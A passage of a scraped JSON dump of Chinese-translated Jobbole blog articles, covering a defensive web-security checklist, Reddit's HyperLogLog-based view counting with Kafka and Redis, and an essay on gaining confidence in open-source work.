src=\"http://jbcdn2.b0.upaiyun.com/2016/08/a64465daeaf26033e2afcd40659beab2.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111399\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111399votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111399\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 5 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/qiaofeng\">乔永琪</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/qiaofeng\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/12/c3d69df6568c8c8861768301d9607a81.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            （新浪微博：@甜菜碱）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/qiaofeng\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/qiaofeng/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/qiaofeng/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 20</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx4.sinaimg.cn/mw690/6941baebly1fgiqen6xoij20dz09943b.jpg"], "fav_nums": 2, "comment_nums": 5, "create_date": "2017/06/12", "praise_nums": 2}
{"tags": "安全,IT技术", "front_image_path": "full/faffb5213d0e473a17c690180106d247ee338b1e.jpg", "title": "做 Web 开发必备的安全核对清单", "url_object_id": "f776d192cb247e5575317aa6172e68f8", "url": "http://blog.jobbole.com/111413/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/q3198108035\">tsteho</a> 翻译，<a href=\"http://www.jobbole.com/members/huanglimin\">黄利民</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://simplesecurity.sensedeep.com/web-developer-security-checklist-f2e4f43c9c56\">Michael O'Brien</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p><img id=\"pic\" class=\"\" src=\"http://wx2.sinaimg.cn/large/7cc829d3gy1fgeq98nzzuj20ic0963yr.jpg\"></p>\n<p>如果能按照本文的这个清单来实践，就能将网络安全方面的风险降得很低。</p>\n<h3><b></b>Web开发人员安全清单</h3>\n<p>在云端开发安全又健壮的 Web 应用非常难。如果你认为这很容易，那你技术水平要么已经很牛叉，要么还没有踩过坑。</p>\n<p>如果你盲目接受<a href=\"https://en.wikipedia.org/wiki/Minimum_viable_product\">最简可行产品</a>（Minimum Viable Product，简称 MVP），并且认为你能在一个月之内创建一个既有价值又安全的产品，那么在你推出你的“产品原型”前，你还需要多想想。在你查看了下面的清单之后，确认你不会犯这些严重的安全问题。至少，你要对你的潜在用户坦诚，让他们知道你还没有一个完整的产品，并且只提供一个没有全面安全的原型。</p>\n<p>这个清单很简单，并且也不是那种大而全的。我已经开发安全的 Web 应用有 14 年多了。这个清单包含了一些相对重要的问题。这些问题都是我在这段时间学到的，而这个过程也是痛苦的。当你在创建 Web 应用时，我希望你能够认真地对待这些问题。</p>\n<p> </p>\n<p>如果在这个清单中，你有我没有提到的项目，请留言补充。</p>\n<h3>数据库</h3>\n<ul>\n<li>[ ] 可以识别用户的数据和敏感数据（如访问令牌、电子邮件地址或账单信息）需要加密。</li>\n<li>[ ] 如果你的数据库在休息状态时支持低成本加密（如<a href=\"https://aws.amazon.com/cn/about-aws/whats-new/2015/12/amazon-aurora-now-supports-encryption-at-rest/\">AWS Aurora</a>），那么启动该功能来保护硬盘上的数据。同时也要确保所有备份都是被加密存储的。</li>\n<li>[ ] 给用户最低访问权限的账户。不要使用数据库的 root 账户。</li>\n<li>[ ] 刻意设计一个密钥库，用它存储和分发机密内容。不要硬编码到你的应用中。</li>\n<li>[ ] 通过只使用 SQL 预处理语句（prepared statements）的方法来完全防止 SQL 注入。比如：如果要使用 NPM，不要使用 npm-mysql，而是使用 npm-mysql2，因为它支持预处理语句。</li>\n</ul>\n<h3>开发</h3>\n<ul>\n<li>[ ] 对于每个发布的版本，确保软件的所有组件都通过了漏洞扫描。组件指的是操作系统、库和包。这应该自动地进入持续集成/持续交付流程。</li>\n<li>[ ] 保证开发系统的安全。同样的，对于你使用的产品系统，也需要保持相同的警惕。在安全、隔离的开发系统中开发软件。</li>\n</ul>\n<h3>认证</h3>\n<ul>\n<li>[ ] 确保所有密码都经过合适的加密方法（如 <a href=\"https://en.wikipedia.org/wiki/Bcrypt\">bcrypt</a> ）的散列处理。永远不要自己实现加密方法，并且用好的随机数据来正确地初始化加密方法。</li>\n<li>[ ] 在实现登录、忘记密码、密码重置等功能时，用经过验证过的最佳实现或组件。不要重复造轮子，因为你很难保证其在所有场景中都不会出现问题。</li>\n<li>[ ]遵循简单且合适的密码规则，鼓励用户使用较长的随机密码。</li>\n<li>[ ] 你们提供的所有服务，用多重认证来验证登录。</li>\n</ul>\n<h3>拒绝服务防护</h3>\n<ul>\n<li>[ ]确保网站不会因 API 遭拒绝服务攻击（DOS）而瘫痪。至少，在相对较慢的 API 路径上（像登录和 Token 生成程序）设置频率限制器。</li>\n<li>[ ] 对用户所提交的数据和请求，在大小以及结构这两点上执行合理的限制。</li>\n<li>[ ] 通过使用全局缓存代理服务（类似 <a href=\"https://www.cloudflare.com/\">CloudFlare</a> ）来规避分布式拒绝服务（DDOS）。如果网站遭到 DDOS 攻击，你就能打开这个服务和其他类似的，以作 DNS 查询。</li>\n</ul>\n<h3>网络流量</h3>\n<ul>\n<li>[ ] 整个网站都使用 TLS，不仅仅是登录表单和响应。 永远不要只在登录表单中使用 TLS。</li>\n<li>[ ] Cookie 必须设置 httpOnly、安全、被路径和域限定。</li>\n<li>[ ] 使用内容策略安全（<a href=\"https://en.wikipedia.org/wiki/Content_Security_Policy\">CSP</a>），并且不允许 unsafe-*（*是通配符）后门。虽然配置时很痛苦，但这是值得做的。</li>\n<li>[ ] 在客户端的响应头中使用 X-Frame-Option、X-XSS-Protection。</li>\n<li>[ ] 使用 HSTS 响应强制仅限 TLS 访问。在服务器上重定向所有 HTTP 请求到 HTTPS，作为替代方案。</li>\n<li>[ ] 在所有的表单中使用 CSRF 令牌（Token）。使用新的 <a href=\"https://scotthelme.co.uk/csrf-is-dead/\">SameSite Cookie</a> 响应头，这彻底解决了所有较新浏览器上的 CSRF 问题。</li>\n</ul>\n<h3>API</h3>\n<ul>\n<li>[ ] 确保公开 API 中没有可枚举的资源。</li>\n<li>[ ] 确保用户经过全面的认证，并且拥有适当权限的用户才能访问 API。</li>\n<li>[ ] 在 API 中使用随机检查，以检测潜在攻击的非法或异常请求。</li>\n</ul>\n<h3>验证</h3>\n<ul>\n<li>[ ] 为了给用户快速的反馈，可以在客户端做输入合法性验证，但是永远不要相信用户的输入数据。</li>\n<li>[ ] 在服务器端使用白名单，来验证所有用户的输入。永远不要直接将用户的内容添加到响应中。永远不要在 SQL 语句中使用用户输入的内容。</li>\n</ul>\n<h3>云配置</h3>\n<ul>\n<li>[ ] 确保所有的服务打开尽可能少的端口。当隐晦式安全（security through obscurity）没有保护的效果时, 将默认的端口替换成非标准的端口，这样可以让攻击者更难攻破。</li>\n<li>[ ] 将后端数据库和服务托管到私有 VPC 上 (虚拟私有云)，而 VPC 不能被任何公共网络访问。当你在配置 AWS 安全组和对等 VPC 时，你需要非常仔细，因为这可能导致服务无意中对外部开放。</li>\n<li>[ ] 在隔离 VPC 和对等 VPC 里隔离逻辑服务，以便支持跨服通信。</li>\n<li>[ ] 确保所有服务接收的数据，来自于一个尽可能小范围内的 IP 地址。</li>\n<li>[ ] 限制出站 IP 和端口流量，最大限度地减少 APT 攻击带来的损失和“通讯”。</li>\n<li>[ ] 始终使用 AWS 访问管理（IAM）这个身份，而不是 root 凭据。</li>\n<li>[ ] 授予所有操作和开发人员最小的访问权限。</li>\n<li>[ ] 根据时间表定期地更换密码和访问密钥。</li>\n</ul>\n<h3>基础设施</h3>\n<ul>\n<li>[ ] 确保你能在不停机的情况下升级。确保你能通过完全自动的方式快速升级。</li>\n<li>[ ] 使用像 Terraform 这样的工具创建所有的基础架构，而不是通过云端控制台。基础架构应该被定义为“代码”，并且能够按下按钮来重建。对于任何在云端手动创建的资源采取零容忍态度，之后 Terraform 就能审计你的配置了。</li>\n<li>[ ] 所有服务都使用集中式日志架构。你永远都不应该需要 SSH 来访问或者检索日志。</li>\n<li>[ ] 除了一次性诊断，不要通过 SSH 连接到你的服务。通常使用 SSH 意味着你没有自动执行重要任务。</li>\n<li>[ ] 永远不要在任何 AWS 服务组上保持 22 号端口为打开的状态。</li>\n<li>[ ] 创建<a href=\"http://chadfowler.com/2013/06/23/immutable-deployments.html\">不变的主机</a>，而不是不断地给你长寿的服务器打补丁和升级。(参见<a href=\"https://simplesecurity.sensedeep.com/immutable-infrastructure-can-be-dramatically-more-secure-238f297eca49\">Immutable Infrastructure Can Be More Secure</a>).</li>\n<li>[ ] 使用<a href=\"https://en.wikipedia.org/wiki/Intrusion_detection_system\">入侵检测系统</a>来最大化减少 <a href=\"https://en.wikipedia.org/wiki/Advanced_persistent_threat\">APT</a> 攻击带来的影响。</li>\n</ul>\n<h3>运营</h3>\n<ul>\n<li>[ ] 关闭未使用的服务和服务器。断电的服务器是最安全的。</li>\n</ul>\n<h3>测试</h3>\n<ul>\n<li>[ ] 审计你的设计和实施。</li>\n<li>[ ] 做渗透测试。除了你之外，还可以叫其他人进行渗透测试。</li>\n</ul>\n<h3>培训</h3>\n<ul>\n<li>就关于社会工程领域中的潜在威胁和相关防护技术，要对员工（特别是高级员工）进行培训。</li>\n</ul>\n<h3>最后，制定一个计划</h3>\n<ul>\n<li>[ ] 做一个威胁模型，描述你正在防御对象。按主次列出可能的威胁和参与者。</li>\n<li>[ ] 制定一份可实操的安全事故计划。总有一天你会需要的。</li>\n</ul>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111413\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111413votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111413\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 7 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/q3198108035\">tsteho</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/q3198108035\">\r\n\t\t\t<img src=\"http://q.qlogo.cn/qqapp/208656/78BB6F88A07D4D78DB552CAD9BD3D689/100\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            Python爱好者        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/q3198108035\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/q3198108035/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/q3198108035/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 13</a> · <a title=\"QQ：3280767506\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx2.sinaimg.cn/large/7cc829d3gy1fgeq98nzzuj20ic0963yr.jpg"], "fav_nums": 7, "comment_nums": 0, "create_date": "2017/06/10", "praise_nums": 2}
{"tags": "Reddit,HyperLogLog,IT技术", "front_image_path": "full/be3c037cbb3c7c32899af846d32a664913c16963.jpg", "title": "Reddit 如何统计每个帖子的浏览量", "url_object_id": "ce55facb32cdaa01d9d66d8cccce5a05", "url": "http://blog.jobbole.com/111393/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://redditblog.com/2017/05/24/view-counting-at-reddit/\">redditblog</a>   译文出处：<a target=\"_blank\" href=\"http://yemengying.com/2017/06/04/reddit-view-counting/\">yemengying</a>   </div><p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/998ce63f36097881b592d75c920250e6.png\" alt=\"\"></p>\n<p>我们想要更好地向用户展示 Reddit 的规模。为了这一点，投票和评论数是一个帖子最重要的指标。然而，在 Reddit 上有相当多的用户只浏览内容，既不投票也不评论。所以我们想要建立一个能够计算一个帖子浏览数的系统。这一数字会被展示给帖子的创作者和版主，以便他们更好的了解某个帖子的活跃程度。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/ce48672da2acb834090d2b83e6d8fc50.png\" alt=\"\"></p>\n<p>在这篇博客中，我们将讨论我们是如何实现超大数据量的计数。</p>\n<h2 id=\"计数机制\">计数机制</h2>\n<p>对于计数系统我们主要有四种需求:</p>\n<ul>\n<li>帖子浏览数必须是实时或者近实时的，而不是每天或者每小时汇总。</li>\n<li>同一用户在短时间内多次访问帖子，只算一个浏览量</li>\n<li>显示的浏览量与真实浏览量间允许有小百分之几的误差</li>\n<li>Reddit 是全球访问量第八的网站，系统要能在生产环境的规模上正常运行，仅允许几秒的延迟</li>\n</ul>\n<p>要全部满足以上四个需求的困难远远比听上去大的多。为了实时精准计数，我们需要知道某个用户是否曾经访问过这篇帖子。想要知道这个信息，我们就要为每篇帖子维护一个访问用户的集合，然后在每次计算浏览量时检查集合。一个 naive 的实现方式就是将访问用户的集合存储在内存的 hashMap 中，以帖子 Id 为 key。</p>\n<p>这种实现方式对于访问量低的帖子是可行的，但一旦一个帖子变得流行，访问量剧增时就很难控制了。甚至有的帖子有超过 100 万的独立访客！ 对于这样的帖子，存储独立访客的 ID 并且频繁查询某个用户是否之前曾访问过会给内存和 CPU 造成很大的负担。</p>\n<p>因为我们不能提供准确的计数，我们查看了几种不同的<a href=\"https://en.wikipedia.org/wiki/Count-distinct_problem\" target=\"_blank\" rel=\"external\">基数估计算法</a>。有两个符合我们需求的选择：</p>\n<ul>\n<li>一是线性概率计数法，很准确，但当计数集合变大时所需内存会线性变大。</li>\n<li>二是基于 <a href=\"http://algo.inria.fr/flajolet/Publications/FlFuGaMe07.pdf\" target=\"_blank\" rel=\"external\">HyperLogLog</a> (以下简称 HLL )的计数法。 HLL 空间复杂度较低，但是精确度不如线性计数。</li>\n</ul>\n<p>下面看下 HLL 会节省多少内存。如果我们需要存储 100 万个独立访客的 ID, 每个用户 ID 8 字节长，那么为了存储一篇帖子的独立访客我们就需要 8 M的内存。反之，如果采用 HLL 会显著减少内存占用。不同的 HLL 实现方式消耗的内存不同。如果采用<a href=\"http://antirez.com/news/75\" target=\"_blank\" rel=\"external\">这篇文章</a>的实现方法，那么存储 100 万个 ID 仅需 12 KB，是原来的 0.15%！！</p>\n<p><a href=\"http://highscalability.com/blog/2012/4/5/big-data-counting-how-to-count-a-billion-distinct-objects-us.html\" target=\"_blank\" rel=\"external\">Big Data Counting: How to count a billion distinct objects using only 1.5KB of Memory – High Scalability –</a>这篇文章很好的总结了上面的算法。</p>\n<p>许多 HLL 的实现都是结合了上面两种算法。在集合小的时候采用线性计数，当集合大小到达一定的阈值后切换到 HLL。前者通常被成为 ”稀疏“(sparse) HLL，后者被称为”稠密“(dense) HLL。这种结合了两种算法的实现有很大的好处，因为它对于小集合和大集合都能够保证精确度，同时保证了适度的内存增长。可以在 google 的这篇<a href=\"https://stefanheule.com/papers/edbt13-hyperloglog.pdf\" target=\"_blank\" rel=\"external\">论文</a>中了解这种实现的详细内容。</p>\n<p>现在我们已经确定要采用 HLL 算法了，不过在选择具体的实现时，我们考虑了以下三种不同的实现。因为我们的数据工程团队使用 Java 和 Scala，所以我们只考虑 Java 和 Scala 的实现。</p>\n<ul>\n<li>Twitter 提供的 <a href=\"https://twitter.github.io/algebird/datatypes/approx/hyperloglog.html\" target=\"_blank\" rel=\"external\">Algebird</a>，采用 Scala 实现。Algebird 有很好的文档，但他们对于 sparse 和 dense HLL 的实现细节不是很容易理解。</li>\n<li><a href=\"https://github.com/addthis/stream-lib\" target=\"_blank\" rel=\"external\">stream-lib</a>中提供的 HyperLogLog++， 采用 Java 实现。stream-lib 中的代码文档齐全，但有些难理解如何合适的使用并且改造的符合我们的需求。</li>\n<li><a href=\"http://antirez.com/news/75\" target=\"_blank\" rel=\"external\">Redis HLL 实现</a>，这是我们最终选择的。我们认为 Redis 中 HLLs 的实现文档齐全、容易配置，提供的相关 API 也很容易集成。还有一个好处是，我们可以用一台专门的服务器部署，从而减轻性能上的压力。</li>\n</ul>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/16ccb06f98572ee8c2c9862b601b5330.png\" alt=\"\"></p>\n<p>Reddit 的数据管道依赖于 Kafka。当一个用户访问了一篇博客，会触发一个事件，事件会被发送到事件收集服务器，并被持久化在 Kafka 中。</p>\n<p>之后，计数系统会依次顺序运行两个组件。在我们的计数系统架构中，第一部分是一个 Kafka 的消费者，我们称之为 Nazar。Nazar 会从 Kafka 中读取每个事件，并将它通过一系列配置的规则来判断该事件是否需要被计数。我们取这个名字仅仅是因为 Nazar 是一个眼睛形状的护身符，而 ”Nazar“ 系统就像眼睛一样使我们的计数系统远离不怀好意者的破坏。其中一个我们不将一个事件计算在内的原因就是同一个用户在很短时间内重复访问。Nazar 会修改事件，加上个标明是否应该被计数的布尔标识，并将事件重新放入 Kafka。</p>\n<p>下面就到了系统的第二个部分。我们将第二个 Kafka 的消费者称作 Abacus，用来进行真正浏览量的计算，并且将计算结果显示在网站或客户端。Abacus 从 Kafka 中读取经过 Nazar 处理过的事件，并根据 Nazar 的处理结果决定是跳过这个事件还是将其加入计数。如果 Nazar 中的处理结果是可以加入计数，那么 Abacus 首先会检查这个事件所关联的帖子在 Redis 中是否已经存在了一个 HLL 计数器。如果已经存在，Abacus 会给 Redis 发送个 PFADD 的请求。如果不存在，那么 Abacus 会给 Cassandra 集群发送个请求（Cassandra 用来持久化 HLL 计数器和 计数值的），然后向 Redis 发送 <a href=\"https://redis.io/commands/set\" target=\"_blank\" rel=\"external\">SET</a> 请求。这通常会发生在网友访问较老帖子的时候，这时该帖子的计数器很可能已经在 Redis 中过期了。</p>\n<p>为了存储存在 Redis 中的计数器过期的老帖子的浏览量。Abacus 会周期性的将 Redis 中全部的 HLL 和 每篇帖子的浏览量写入到 Cassandra 集群中。为了避免集群过载，我们以 10 秒为周期批量写入。</p>\n<p>下图是事件流的大致流程：<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/d09187e95644ef43035e135057ea6dcc.jpg\" alt=\"\"></p>\n<h2 id=\"总结\">总结</h2>\n<p>我们希望浏览量可以让发帖者了解帖子全部的访问量，也帮助版主快速定位自己社区中高访问量的帖子。在未来，我们计划利用我们数据管道在实时方面的潜力来为 Reddit 的用户提供更多的有用的反馈。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111393\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111393votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111393\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/06/998ce63f36097881b592d75c920250e6.png"], "fav_nums": 1, "comment_nums": 0, "create_date": "2017/06/08", "praise_nums": 2}
{"tags": "开源,其他", "front_image_path": "full/dd36e1ac9db2af41888b4a17b76a865bb91d4510.jpg", "title": "如何从参与开源项目的过程中获取自信", "url_object_id": "9261ff54c843739fda641c040280ce25", "url": "http://blog.jobbole.com/109892/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/17/1/3-ways-improve-your-confidence\">Laura Hilliger</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-8592-1.html\">Linux中国/GHLandy</a>   </div><p>随着大脑的发育，你渐渐学会了这世上什么事情可以/应该做，以及什么事情不能/不应该做。你所有的行为都受到周围大众的影响，很多时候，阻碍你参与某事的原因就是你缺乏自信。</p>\n<p>纵观我们的生活，我们都或多或少的受到了世俗和社会行为的“教条”影响。我们可能从小就被这样教育：演说家说的都是真理、CEO 都是有远见的、警察维护社会秩序，尊重别人代表着静听让人把话说完，如果人家说错了，你要看场合轻柔的指出来 —— 好吧，这有点复杂。</p>\n<p>当你决心参与到开源项目之中去的时候，自信将扮演重要角色。开源社区有其固有的参与性。参与就相当于开源世界的流通货币，持有该货币的量取决于你的自信。你的参与性越高、技能越高、分享你的想法和简洁次数越多，你就越能通过自己的<ruby>提交<rt>commit</rt></ruby>来改善某一个项目。所有这些都需要你有很强的信念 —— 你有值得分享的事情 —— 并且你会常常思考自己要做什么、分享什么。</p>\n<p>这里不得不说说这样一个事实：我们每一个人都一些值得分享的事情。但是你要找出这个值得分享的事情是什么，以及在哪个位置分享它才能把这个分享推向最积极、最有意义的一面。</p>\n<p>认真思考一下三点，这将增强你的自信，并能让你在开源社区中更容易取得进步。</p>\n<h3 id=\"toc_1\">没有人会站在你的角度来看待你</h3>\n<p>你要时刻谨记着：你是完全独立的个人，他人对你做出的评论就像是不存在一样，只有这样才能更好的获得自信。</p>\n<p>我们都习惯了这样认知，周围的人都是根据我们的行为来做出评判的。这一习惯是学习如何更像社会群体一样生活的副产品。而且很可能在我们的童年，父母根据我们的行为设置的奖励机制时，这个习惯就根植我们心底。到了青春期，老师们对我们的表现来评价，给我们划分等级和分数，拿我们和身边的小伙伴对比。这样的动力和奖励机制给我们的大脑建立了一个包括自我反思在内的反馈回路。我们需要预测自己能否得到回报，并要为那些可能发生的事情做好应对。</p>\n<p>现今的我们都有这样第一个疑惑：身边的人是如何看我的？然而，真相是多数人都不会花太多时间来对你进行正确客观的评价。我们所有人只是关注自己的回报，我们有自己热衷于某件事的的热情、有大量急待解决的问题。也有一些人忙于关心他们自己如何影响身边的人，他们并不会在身上花费时间。他们根本不会注意到你是否出错、大声谈话还是像他们的背景音乐一样。所有的那些疑惑都只是在你自己的脑海中而已，而非在其他任何人脑中。</p>\n<p>我们需要被人们所接受的愿望也是人生意义的一部分，但是这类受我们所遇之人的一时兴起。这些人可能对我们缺乏全面认识，比如我们叫什么、我们来自哪里、形成我们认知的经历，等等。我们能否为人们所接受是一件不受我们自身控制的事情。但是，我们是可以通过与之交流来改变的。</p>\n<p>在开源的社区化世界里，记住这一点是非常重要的：人们是不会过多的考虑你的感受的。因为你的同事和导师都在忙于其它项目或则社区成员。</p>\n<p>一旦你认知了这一点，通过积极地沟通来热情拥抱这个世界吧。寻求帮助、告知他人你的需求、指出你的贡献、让人们知道你和他们在一起努力、你也是这个社区中的活跃分子。当人们向你靠拢 ——而非相反 —— 时，你的开源可信度和自信会得到极大的提高。</p>\n<h3 id=\"toc_2\">所有人都热衷于分享自己熟知的事情</h3>\n<p>任何成功的开源社区都是一个包含教和学的社区。为沐浴在开源中，你不仅需要用到自身的已有知识，还需要不断的吸收消化其他人提供课程中的知识。幸运的是，人们都普遍热衷于分享他们熟悉的事情。</p>\n<p>思考一下，当他人问及你的观点时，你是什么感受。得知他人认可了你所说的观点，对你的本我和自我是多么美好的一件事。</p>\n<p>在儿童期时，我们的大脑并没有那么发达，无法为我们容纳现实世界中大量的信息量。我们曾一度认为自己是世界的中心。在六岁以前，我们的认知一直在不断成长。在此期间，我们的父母会因我们哭泣而做出回应，周围的成年人都会满足我们要求。这会在我们心底形成自己在世界上最重要的证据。</p>\n<p>我们的神经回路在此期间建立完成，我们的性格也在此期间形成。随着我们学会参与社会和城市的生活，我们逐渐的认识到自己并非世界的中心。然而，最初形成并深植我们心底那种意识并不会因此马上就消除掉。正确理解我们在整个社会氛围中的个人意识将有助于你与他人建立连接并融洽相处。</p>\n<p>在团结协作中慢慢积累学习经验可以很好的磨练自己、发展自己社会关系和提高自身技能。想要进军开源的世界，不断地学习是不可或缺的。</p>\n<p>那么，这些和自信有些什么关系呢？通过表明你重视他人的知识和付出，你提高的不仅是他们的自信，还有你自己的自信。那时你将会感到更加灵活。有些时候，你不得不承认自己也有不懂的地方。</p>\n<p>自信的人也许会说“是的，我不知道”，但却不会因此而沮丧。</p>\n<h3 id=\"toc_3\">一分耕耘，一分收获</h3>\n<p>你一定听过“不懂装懂，永远是饭桶”。这样说吧，自信就像其他很多的心理现象。积极地提示自己：我很聪明、有趣、引人关注、极富天赋、健谈、是一个很好的伙伴、独一无二、知识面广、学习能力强、常常自省的思想者，或者是其他你想要具备的特质，久而久之你就会觉得自己就是这样的人。并且，如果这可以在你身上生效，在其他人身上也一样。。</p>\n<p>我们把这个称为自我肯定。</p>\n<p>此外，在开源的世界中，你是如何为人考虑、如何待人，那么反过来，他人也会是这样的。如果你想在开源贡献中获得成功，你就要有足够的自信来相信自己坚持的立场和事物，当然了，你要以一种可以让人接受的方式来表现，同时还要包容其他的意见和观点。领导者的标志就是，在生活中塑造他们想要看到的形象，而不管是否有他人模仿。</p>\n<p>那么，你是否有其他增强自信的方法呢？记得在评论区告诉我们哦。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"109892\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"109892votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"109892\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div 